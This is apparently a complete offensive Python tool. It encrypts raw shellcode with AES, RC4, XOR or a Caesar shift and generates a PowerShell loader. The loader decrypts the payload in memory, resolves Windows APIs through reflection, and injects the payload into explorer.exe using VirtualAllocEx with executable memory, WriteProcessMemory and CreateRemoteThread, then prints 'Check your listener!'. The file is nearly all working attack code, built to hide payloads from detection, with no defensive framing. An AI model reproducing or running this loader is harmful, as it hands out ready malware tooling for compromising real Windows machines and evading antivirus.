from Crypto.Cipher import AES, ARC4
from Crypto.Util.Padding import pad
import os
import sys

def encrypt_shellcode_aes(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

    return iv, key, encrypted_shellcode

def encrypt_shellcode_caesar(shellcode_path, shift):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    encrypted_shellcode = bytearray(((byte + shift) & 0xFF) for byte in shellcode)

    return encrypted_shellcode

def encrypt_shellcode_rc4(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = ARC4.new(key)
    encrypted_shellcode = cipher.encrypt(shellcode)

    return encrypted_shellcode

def encrypt_shellcode_xor(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    encrypted_shellcode = bytearray((byte ^ key) for byte in shellcode)

    return encrypted_shellcode

def generate_powershell_template(encrypted_shellcode, method, iv=None, key=None, shift=None, xor_key=None):
    encrypted_shellcode_str = ','.join(f'0x{b:02x}' for b in encrypted_shellcode)

    # Prepare decryption functions based on the method used
    decryption_method = ""
    decryption_code = ""

    if method == "AES":
        iv_str = ','.join(f'0x{b:02x}' for b in iv)
        key_str = ','.join(f'0x{b:02x}' for b in key)
        decryption_method = """
function AESDecrypt {
    param (
        [Byte[]]$data,
        [Byte[]]$key,
        [Byte[]]$iv
    )

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($data, 0, $data.Length)
    $cs.Close()
    return $ms.ToArray()
}
"""
        decryption_code = f"""
$iv = [Byte[]]@({iv_str})
$key = [Byte[]]@({key_str})
$encryptedShellcode = [Byte[]]@({encrypted_shellcode_str})
$decryptedShellcode = AESDecrypt -data $encryptedShellcode -key $key -iv $iv
"""
    elif method == "Caesar":
        decryption_method = """
function CaesarDecrypt {
    param (
        [Byte[]]$data,
        [int]$shift
    )

    $decrypted = @()
    foreach ($byte in $data) {
        $decrypted += [byte](($byte - $shift) -band 0xFF)
    }
    return ,$decrypted
}
"""
        decryption_code = f"""
$shift = {shift}
$encryptedShellcode = [Byte[]]@({encrypted_shellcode_str})
$decryptedShellcode = CaesarDecrypt -data $encryptedShellcode -shift $shift
"""
    elif method == "RC4":
        key_str = ','.join(f'0x{b:02x}' for b in key)
        decryption_method = """
function RC4Decrypt {
    param (
        [Byte[]]$data,
        [Byte[]]$key
    )

    $S = 0..255
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i %% $key.Length]) %% 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    $i, $j = 0, 0
    $output = @()
    foreach ($byte in $data) {
        $i = ($i + 1) %% 256
        $j = ($j + $S[$i]) %% 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        $K = $S[($S[$i] + $S[$j]) %% 256]
        $output += [byte]($byte -bxor $K)
    }

    return ,$output
}
"""
        decryption_code = f"""
$key = [Byte[]]@({key_str})
$encryptedShellcode = [Byte[]]@({encrypted_shellcode_str})
$decryptedShellcode = RC4Decrypt -data $encryptedShellcode -key $key
"""
    elif method == "XOR":
        decryption_method = """
function XORDecrypt {
    param (
        [Byte[]]$data,
        [Byte]$key
    )

    $decrypted = @()
    foreach ($byte in $data) {
        $decrypted += [byte]($byte -bxor $key)
    }
    return ,$decrypted
}
"""
        decryption_code = f"""
$xorKey = {xor_key}
$encryptedShellcode = [Byte[]]@({encrypted_shellcode_str})
$decryptedShellcode = XORDecrypt -data $encryptedShellcode -key $xorKey
"""

    template = f"""
# Importación de funciones de API de Windows usando reflexión
{decryption_method}

# Desencriptar shellcode según el método
{decryption_code}

# Procedimiento de Inyección de Proceso en explorer.exe
function LookupFunc {{
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {{If($_.Name -eq "GetProcAddress") {{$tmp+=$_}}}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}}

function getDelegateType {{
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}}

# Obtener el ID del proceso de explorer.exe
$procId = (Get-Process explorer).Id

# C#: IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, procId);
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
  (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)

# C#: IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
$expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$decryptedShellcode.Length, 0x3000, 0x40)

# C#: bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
  (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $decryptedShellcode, [Uint32]$decryptedShellcode.Length, [IntPtr]::Zero)         

# C#: IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

Write-Host "Injected! Check your listener!"
"""
    return template

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <shellcode.bin> <output.ps1> <method>")
        print("Methods: AES, Caesar, RC4, XOR")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    output_path = sys.argv[2]
    method = sys.argv[3]

    if method == "AES":
        key = os.urandom(32)  # Generate a random 256-bit key
        iv, key, encrypted_shellcode = encrypt_shellcode_aes(shellcode_path, key)
        powershell_code = generate_powershell_template(encrypted_shellcode, method, iv=iv, key=key)
    elif method == "Caesar":
        shift = 3  # Example shift value for Caesar cipher
        encrypted_shellcode = encrypt_shellcode_caesar(shellcode_path, shift)
        powershell_code = generate_powershell_template(encrypted_shellcode, method, shift=shift)
    elif method == "RC4":
        key = os.urandom(16)  # Generate a random 128-bit key for RC4
        encrypted_shellcode = encrypt_shellcode_rc4(shellcode_path, key)
        powershell_code = generate_powershell_template(encrypted_shellcode, method, key=key)
    elif method == "XOR":
        xor_key = os.urandom(1)[0]  # Generate a random single-byte key for XOR
        encrypted_shellcode = encrypt_shellcode_xor(shellcode_path, xor_key)
        powershell_code = generate_powershell_template(encrypted_shellcode, method, xor_key=xor_key)
    else:
        print("Invalid method. Choose AES, Caesar, RC4, or XOR.")
        sys.exit(1)

    with open(output_path, "w") as f:
        f.write(powershell_code)

    print(f"Generated {output_path} with {method}-encrypted shellcode for process injection into explorer.exe.")

if __name__ == "__main__":
    main()
